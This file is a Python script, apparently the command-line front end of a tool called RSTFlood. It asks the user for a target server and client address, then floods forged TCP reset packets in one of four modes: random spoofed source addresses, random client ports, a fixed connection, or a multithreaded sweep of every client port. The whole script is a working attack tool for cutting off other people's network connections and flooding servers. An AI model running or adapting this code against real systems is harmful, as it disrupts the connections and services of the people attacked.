import os
import sys
import time
import threading
import _thread
import rst

def echo_another():
    print("RSTFlood Utils [https://github.com/DreamDevelopmentTeam/RSTFlood.git]")
    print("By YELANDAOKONG")

def echo():
    print("Echo")

def echo_again():
    print("Echo again")

def echo_yet_again():
    print("Echo yet again")

def echo_yet_yet_again():
    print("Echo yet yet again")

def echo_yet_yet_yet_again():
    print("Echo yet yet yet again")

def echo_yet_yet_yet_yet_again():
    print("Echo yet yet yet yet again")

def clear():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")


def exit():
    print("Exiting...")
    sys.exit()

def choose():
    while True:
        print("Choose an option: ")
        print("=> 1. Random client IP/port and known server IP/port")
        print("=> 2. Unknown client port and known server IP/port, client IP")
        print("=> 3. Known client IP/port, server IP/port")
        print("=> 4. Unknown client port and known server IP/port, client IP [Multi-threading, 0-65535]")
        print("")
        input_str = input("Your choice > ")
        num = 0
        try:
            num = int(input_str)
        except ValueError:
            print("\nInvalid input, please try again.")
            continue
        if num == 0 or num > 4:
            print("\nInvalid input, please try again.")
            continue
        else:
            return num
            break



def attack4_thread(cip, sip, sport):
    temp = range(1, 65535)
    for i in temp:
        rst.send_tcp_rst(cip, i, sip, sport)


if __name__ == "__main__":
    clear()
    echo_another()
    i = choose()
    inum = 0
    if i == 1:
        saddr = ""
        sport = ""
        while True:
            saddr = input("Server IP > ")
            sport = input("Server port > ")
            # check sport vailid
            if not sport.isdigit() or int(sport) < 1 or int(sport) > 65535:
                print("Invalid input, please try again.")
                continue
            else:
                break
        clear()
        echo_another()
        print("")
        print("Mode => (1) Random client IP/port and known server IP/port")
        print("")
        print("Server IP/port: " + saddr + ":" + sport)
        print("")
        while True:
            try:
                rip = rst.get_random_IP()
                rport = rst.get_random_port()
                #print("===> Client IP/port: " + str(rip) + ":" + str(rport))
                rst.send_tcp_rst(rip, int(rport), saddr, int(sport))
                inum = inum + 1
            except KeyboardInterrupt:
                print("Stop.")
                exit()
            except Exception as e:
                print("Error: " + str(e))
                exit()
    if i == 2:
        saddr = ""
        sport = ""
        caddr = ""
        while True:
            saddr = input("Server IP > ")
            sport = input("Server port > ")
            caddr = input("Client IP > ")
            # check sport vailid
            if not sport.isdigit() or int(sport) < 1 or int(sport) > 65535:
                print("Invalid input, please try again.")
                continue
            else:
                break
        clear()
        echo_another()
        print("")
        print("Mode => (2) Unknown client port and known server IP/port, client IP")
        print("")
        print("Server IP/port: " + saddr + ":" + sport)
        print("Client IP/port: " + caddr + ":" + "Unknown")
        print("")
        while True:
            try:
                rport = rst.get_random_port()
                #print("===> Client IP/port: " + str(caddr) + ":" + str(rport))
                rst.send_tcp_rst(caddr, int(rport), saddr, int(sport))
                inum = inum + 1
            except KeyboardInterrupt:
                print("Stop.")
                exit()
            except Exception as e:
                print("Error: " + str(e))
                exit()

    if i == 3:
        saddr = ""
        sport = ""
        caddr = ""
        cport = ""
        while True:
            saddr = input("Server IP > ")
            sport = input("Server port > ")
            caddr = input("Client IP > ")
            cport = input("Client port > ")
            # check sport vailid
            if not sport.isdigit() or int(sport) < 1 or int(sport) > 65535:
                print("Invalid input, please try again.")
                continue
            else:
                if not cport.isdigit() or int(cport) < 1 or int(cport) > 65535:
                    print("Invalid input, please try again.")
                    continue
                else:
                    break
        clear()
        echo_another()
        print("")
        print("Mode => (3) Known client IP/port, server IP/port")
        print("")
        print("Server IP/port: " + saddr + ":" + sport)
        print("Client IP/port: " + caddr + ":" + cport)
        print("")
        while True:
            try:
                # print("===> Client IP/port: " + str(caddr) + ":" + str(cport))
                rst.send_tcp_rst(caddr, int(cport), saddr, int(sport))
                inum = inum + 1
            except KeyboardInterrupt:
                print("Stop.")
                exit()
            except Exception as e:
                print("Error: " + str(e))
                exit()
    if i == 4:
        saddr = ""
        sport = ""
        caddr = ""
        while True:
            saddr = input("Server IP > ")
            sport = input("Server port > ")
            caddr = input("Client IP > ")
            # check sport vailid
            if not sport.isdigit() or int(sport) < 1 or int(sport) > 65535:
                print("Invalid input, please try again.")
                continue
            else:
                break
        clear()
        echo_another()
        print("")
        print("Mode => (4) Unknown client port and known server IP/port, client IP [Multi-threading, 0-65535]")
        print("")
        print("Server IP/port: " + saddr + ":" + sport)
        print("Client IP/port: " + caddr + ":" + "Unknown")
        print("")
        ts = []
        for i in range(4):
            t = threading.Thread(target=attack4_thread, args=(caddr, saddr, int(sport)))
            t.start()
            ts.append(t)
            # t = _thread.start_new_thread(attack4_thread, (caddr, saddr, int(sport)))
        while True:
            try:
                # rport = rst.get_random_port()
                # # print("===> Client IP/port: " + str(caddr) + ":" + str(rport))
                # rst.send_tcp_rst(caddr, int(rport), saddr, int(sport))
                # inum = inum + 1
                pass
            except KeyboardInterrupt:
                print("Stop.")
                # 强制退出，无视正在运行的线程
                for t in ts:
                    t.join()
                exit()

            except Exception as e:
                print("Error: " + str(e))
                exit()